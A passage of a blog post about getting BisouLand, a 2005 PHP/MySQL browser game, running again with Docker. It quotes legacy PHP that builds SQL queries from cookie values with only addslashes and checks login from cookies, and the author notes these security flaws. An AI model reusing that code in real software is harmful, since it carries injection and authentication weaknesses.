  if (isset($_COOKIE['pseudo']) &amp;&amp; isset($_COOKIE['mdp']))
  {
    $pseudo = htmlentities(addslashes($_COOKIE['pseudo']));
    $mdp = htmlentities(addslashes($_COOKIE['mdp']));
    //La requ√™te qui compte le nombre de pseudos
    $sql = mysql_query("SELECT COUNT(*) AS nb_pseudo FROM membres WHERE pseudo='".$pseudo."'");
    if (mysql_result($sql,0,'nb_pseudo') != 0)
    {
      //S√©lection des informations.
      $sql_info = mysql_query("SELECT id, confirmation, mdp, nuage FROM membres WHERE pseudo='".$pseudo."'");
      $donnees_info = mysql_fetch_assoc($sql_info);
      //Si le mot de passe est le m√™me (le mot de passe est d√©j√† crypt√©).
      if ($donnees_info['mdp'] == $mdp)
      {
        //Si le compte est confirm√©.
        if ($donnees_info['confirmation'] == 1)
        {
          //On modifie la variable qui nous indique que le membre est connect√©.
          $_SESSION['logged'] = true;
          $page='cerveau';
        }
      }
    }
  }
}

if ($_SESSION['logged'] == true)
{
  //l'id du membre.
  $id=$_SESSION['id'];

  //Fonction destin√©e √† l'administration
  if (isset($_POST['UnAct']) &amp;&amp; $id==12)
  {
    actionAdmin();
  }

  $sql_info = mysql_query(
    "SELECT timestamp, coeur, bouche, amour, jambes, smack, baiser, pelle, tech1, tech2, tech3, tech4, dent, langue, bloque, soupe, oeil"
    ." FROM membres WHERE id='".$id."'"
  );
  $donnees_info = mysql_fetch_assoc($sql_info);
  //On r√©cup√®re le nombre de points d'amour.
  $amour = $donnees_info['amour'];
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt; 
  &lt;link rel="stylesheet" media="screen" type="text/css" title="bisouStyle2" href="includes/bisouStyle2.css" /&gt; 
  &lt;link rel="shorcut icon" href="http://bisouland.piwai.info/favicon.ico"/&gt;
  &lt;meta http-equiv="Content-Language" content="fr" /&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div id="speedbarre"&gt;
  &lt;?php if ($_SESSION['logged'] == true)
    {?&gt;
      &lt;?php echo formaterNombre(floor($amour)); ?&gt;
    &lt;?php
    }
    else
    {
    ?&gt;
    &lt;a href="connexion.html"&gt;Connexion&lt;/a&gt;
    &lt;?php } ?&gt;
  &lt;/div&gt;

  &lt;div id="corps"&gt;
    &lt;?php
    include('phpincludes/pages.php');
    if (isset($array_pages[$page]))
    {
      include('phpincludes/'.$array_pages[$page]);
    }
    else
    {
      include('phpincludes/erreur404.php');
    }
    ?&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>üòµ</p>

<p>In addition to the spaghetti code, we can immediately spot security issues.
But we cannot fix anything until we can manually test the website,
so how do we get it to run?</p>

<h2 id="containerisation">Containerisation</h2>

<p>Back in 2005, the most common versions of the LAMP stack were:</p>

<ul>
<li>Apache: 2</li>
<li>MySQL: MySQL 4.0 - 5.0</li>
<li>PHP 4.3 - 5.1</li>
</ul>

<p>Applications written for MySQL 4.0 and PHP 4.3 can be run up to MySQL 5.7
and PHP 5.6. Some deprecation notices would be issued, but in terms of backward
compatibility that's how far we can stretch things.</p>

<p>So let's create a <code>Dockerfile</code> that will have Apache 2, PHP 5.6 and MySQL 5.7:</p>

<pre><code># syntax=docker/dockerfile:1

FROM php:5.6-apache

# Update sources.list to use archive repositories for Debian Stretch
RUN sed -i 's/deb.debian.org/archive.debian.org/g' /etc/apt/sources.list \
    &amp;&amp; sed -i 's/security.debian.org/archive.debian.org/g' /etc/apt/sources.list \
    &amp;&amp; sed -i '/stretch-updates/d' /etc/apt/sources.list

# Install system dependencies and PHP extensions in single layer
RUN docker-php-ext-install mysql \
    &amp;&amp; a2enmod rewrite

# Set working directory
WORKDIR /var/www/html

# Copy application files with proper ownership
COPY --chown=www-data:www-data web/ /var/www/html/
</code></pre>

<p>With the following <code>compose.yaml</code>, we'll set up the Apache and MySQL servers:</p>

<pre><code class="yaml">name: skyswoon-monolith

services:
  web:
    build: .
    ports:
      - "8080:80"
    volumes:
      - ./web:/var/www/html
    depends_on:
      - db
    environment:
      DATABASE_HOST: ${DATABASE_HOST}
      DATABASE_USER: ${DATABASE_USER}
      DATABASE_PASSWORD: ${DATABASE_PASSWORD}
      DATABASE_NAME: ${DATABASE_NAME}
    restart: unless-stopped

  db:
    image: mysql:5.7
    platform: linux/amd64
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
      MYSQL_DATABASE: ${DATABASE_NAME}
      MYSQL_USER: ${DATABASE_USER}
      MYSQL_PASSWORD: ${DATABASE_PASSWORD}
    volumes:
      - mysql_data:/var/lib/mysql
    ports:
      - "127.0.0.1:3306:3306"
    restart: unless-stopped

volumes:
  mysql_data:
</code></pre>

<p>You might notice that I've mentioned some environment variables,
to configure the database. These will need to be set in a <code>.env</code> file:</p>

<pre><code># Database
DATABASE_HOST=db
DATABASE_USER=database_user
DATABASE_PASSWORD=database_password
DATABASE_NAME=database_name
# MySQL root password (for Docker)
MYSQL_ROOT_PASSWORD=mysql_root_password
</code></pre>

<p>When the <code>docker compose up</code> is run,
Docker Composer automatically reads from <code>.env</code> and sets the environment variable,
then PHP will copy these into the <code>$_ENV</code> array super global,
so we can get the values like so in <code>web/phpincludes/bd.php</code>:</p>

<pre><code class="php">&lt;?php

function bd_connect()
{
    mysql_pconnect(
        $_ENV['DATABASE_HOST'],
        $_ENV['DATABASE_USER'],
        $_ENV['DATABASE_PASSWORD'],
    );
    mysql_select_db($_ENV['DATABASE_NAME']);
}
</code></pre>

<p>Last but not least, I'm adding a <code>Makefile</code>, to avoid having to type long
<code>docker compose build; docker compose up</code> commands: <a href="https://github.com/pyricau/bisouland/blob/b31597c47a49e0dd2b87fbd55bd608530f81efec/Makefile">see file in github</a>.</p>

<blockquote>
  <p><strong>Super Secret Tip</strong>:
  I've written about <a href="/2025/08/06/my-symfony-dockerfile.html">My Symfony Dockerfile</a>,
  and <a href="/2025/08/06/my-symfony-makefile.html">My Symfony Makefile</a>.</p>
</blockquote>

<h2 id="conclusion">Conclusion</h2>

<blockquote>
  <p>üíª <strong>Source code</strong>:</p>
  
  <ul>
  <li><a href="https://github.com/pyricau/bisouland/tree/4.0.0">Before our changes</a></li>
  <li><a href="https://github.com/pyricau/bisouland/tree/4.0.5">After containerisation</a></li>
  </ul>
</blockquote>

<p><img alt="BisouLand screenshot" src="/images/xl-1-bisouland-screenshot.png" width="100%" /></p>

<p>And we did it! now by typing:</p>

<pre><code class="console">make build; make up
</code></pre>

<p>We get BisouLand running live, 20 years after its conception.</p>

<p>You can visit it there: http://localhost:8080/accueil.html.</p>

<blockquote>
  <p>‚ÅâÔ∏è <em>What do you mean, "it doesn't work"?? It works on my machine!</em></p>
</blockquote>
]]></content>
        </entry>
    </feed>